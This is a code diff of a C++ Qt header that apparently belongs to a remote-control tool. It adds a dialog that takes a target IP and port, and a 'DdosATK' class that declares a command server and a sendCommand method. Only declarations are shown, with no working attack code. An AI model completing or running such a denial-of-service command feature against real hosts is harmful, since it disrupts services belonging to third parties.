@@ -11,23 +11,47 @@
 #include <QWidget>
 #include <QApplication>
 #include <QDesktopWidget>
+#include <QLabel>
+#include <QLineEdit>
+#include <QValidator>
+#include <QPushButton>
+#include <QDialog>
 #include "tcpsocket.h"
 #include "tcpserver.h"
 
-class DdosSpy : public QWidget
+
+class DdosSpy : public QDialog
 {
     Q_OBJECT
 public:
-    explicit DdosSpy(QWidget *parent = 0);
+    explicit DdosSpy(QDialog *parent = 0);
+    int getPORT();
+    QString getIP();
+
+private:
+    QLineEdit *mEditIP;
+    QLineEdit *mEditPORT;
+};
+
+
+
+
+
+
+class DdosATK : public QWidget
+{
+    Q_OBJECT
+public:
+    explicit DdosATK(QWidget *parent = 0);
 
     // 结束符号
     const QByteArray CmdSplit = ";";
     const QByteArray CmdEnd = "\r\n";
 
     // 开始Cmd控制服务器，然后返回新的端口号
-    int startDdosSpyServer(QString userName);
+    int startDdosATKServer();
     // 发送指令
-    void sendCommand(QString IP);
+    void sendCommand(QString IP,int PORT);
 
 private:
     TcpServer *mServer;     // 服务端
